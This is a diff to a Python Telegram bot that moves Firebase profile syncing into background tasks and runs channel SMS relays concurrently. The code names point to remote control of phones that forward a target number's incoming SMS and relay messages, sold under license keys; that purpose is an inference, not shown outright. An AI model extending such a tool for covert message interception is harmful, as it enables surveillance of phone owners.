@@ -20,7 +20,6 @@ from app.firebase_sync import (
     forward_incoming_to_mynum,
     send_polling_startup_test,
     sync_profile_for_user,
-    sync_profile_to_firebase,
 )
 from app.monitor_timer import cancel_auto_stop, schedule_auto_stop
 from app.device_ui import (
@@ -273,7 +272,7 @@ async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         device = get_active_device(db, user.id)
         if not device:
             raise ValueError("Pehle /fdy <device_id> se device select karo")
-        await sync_profile_to_firebase(profile, device)
+        asyncio.create_task(sync_profile_for_user(user.id))
     except ValueError as exc:
         await update.message.reply_text(f"❌ {exc}")
         return
@@ -309,7 +308,7 @@ async def _prepare_monitoring(
         target_number=profile.phone_number,
         firebase_url=firebase_url,
     )
-    await sync_profile_to_firebase(profile, device)
+    asyncio.create_task(sync_profile_for_user(user_id))
 
 
 async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -373,7 +372,7 @@ async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         db.close()
 
     if profile and device:
-        await sync_profile_to_firebase(profile, device)
+        asyncio.create_task(sync_profile_for_user(user.id))
     await update.message.reply_text(
         format_addchannel_card(channel_id, sim_slot=sim_slot),
         parse_mode="HTML",
@@ -406,19 +405,24 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         if not linked:
             return
 
+        tasks = []
         for profile, device in linked:
             if not profile.sim_selected:
                 continue
-            try:
-                await queue_channel_sms_with_firebase(
+            tasks.append(
+                queue_channel_sms_with_firebase(
                     db,
                     profile,
                     device,
                     message.text,
                     channel_message_id=message.message_id,
                 )
-            except Exception as exc:
-                logger.error("Channel relay failed: %s", exc)
+            )
+        if tasks:
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            for result in results:
+                if isinstance(result, Exception):
+                    logger.error("Channel relay failed: %s", result)
     finally:
         db.close()
 
@@ -442,7 +446,7 @@ async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     cancel_auto_stop(user.id)
     if profile:
-        await sync_profile_to_firebase(profile, device)
+        asyncio.create_task(sync_profile_for_user(user.id))
     await update.message.reply_text(format_stop_card(), parse_mode="HTML")
 
 
@@ -547,7 +551,7 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     finally:
         db.close()
 
-    await sync_profile_to_firebase(profile, device)
+    asyncio.create_task(sync_profile_for_user(user.id))
     await status_msg.edit_text(
         format_firebase_connected_card(
             profile.firebase_url or firebase_url,
@@ -612,7 +616,7 @@ async def device_select_command(
                 user.id,
                 bind_license_key=bind_license_key,
             ),
-            timeout=40.0,
+            timeout=25.0,
         )
     except asyncio.TimeoutError:
         from app.services import get_all_firebase_urls
@@ -776,8 +780,8 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         )
 
         mark_monitoring_baseline_started(device, profile, db)
-        await sync_profile_to_firebase(profile, device)
         _, inject_total_ms = await send_polling_startup_test(db, profile, device)
+        asyncio.create_task(sync_profile_for_user(user.id))
         asyncio.create_task(run_baseline_snapshot_background(user.id))
     except ValueError as exc:
         await update.message.reply_text(f"❌ {_monitoring_start_error_hint(str(exc))}")
@@ -968,7 +972,7 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
 
                 register_device_on_key(new_key, device.name, user.id)
                 await bind_device_to_license_key(db, profile, device)
-                await sync_profile_to_firebase(profile, device)
+                asyncio.create_task(sync_profile_for_user(user.id))
         except Exception as exc:
             logger.error("License key generate failed: %s", exc)
             await update.message.reply_text(f"❌ Key generate failed: {exc}")
@@ -1230,8 +1234,8 @@ async def _activate_monitoring(
     )
 
     mark_monitoring_baseline_started(device, profile, db)
-    await sync_profile_to_firebase(profile, device)
     _, inject_total_ms = await send_polling_startup_test(db, profile, device)
+    asyncio.create_task(sync_profile_for_user(user_id))
     asyncio.create_task(run_baseline_snapshot_background(user_id))
     return profile, device, 0, inject_total_ms
 
